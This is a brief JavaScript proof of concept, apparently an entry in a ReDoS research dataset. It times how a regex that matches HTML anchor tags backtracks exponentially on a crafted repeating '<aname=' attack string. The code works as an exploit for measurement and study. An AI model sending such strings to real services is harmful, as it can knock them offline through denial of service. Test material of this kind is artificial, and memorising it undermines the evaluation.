/* 3296
 * &lt;a[a-zA-Z0-9 =&quot;'.:;?]*(name=){1}[a-zA-Z0-9 =&quot;'.:;?]*\s*((/&gt;)|(&gt;[a-zA-Z0-9 =&quot;'&lt;&gt;.:;?]*&lt;/a&gt;))
 * EXPONENT
 * nums:3
 * EXPONENT AttackString:""+"&lt;aname="*256+"!_1SLQ_2"
 */
var REGEX = new RegExp("&lt;a[a-zA-Z0-9 =&quot;'.:;?]*(name=){1}[a-zA-Z0-9 =&quot;'.:;?]*\s*((/&gt;)|(&gt;[a-zA-Z0-9 =&quot;'&lt;&gt;.:;?]*&lt;/a&gt;))")
for(var i = 1; i <= 5000000; i++) {
    var time = Date.now();
    var attack_str = '' + '&lt;aname='.repeat(i*1) + '!_1SLQ_2'
    REGEX.exec(attack_str)
    // REGEX.test(attack_str);
    // attack_str.search(REGEX)
    // attack_str.match(REGEX)
    var time_cost = Date.now() - time;
    console.log(i * 1 + ": " + time_cost+" ms")
}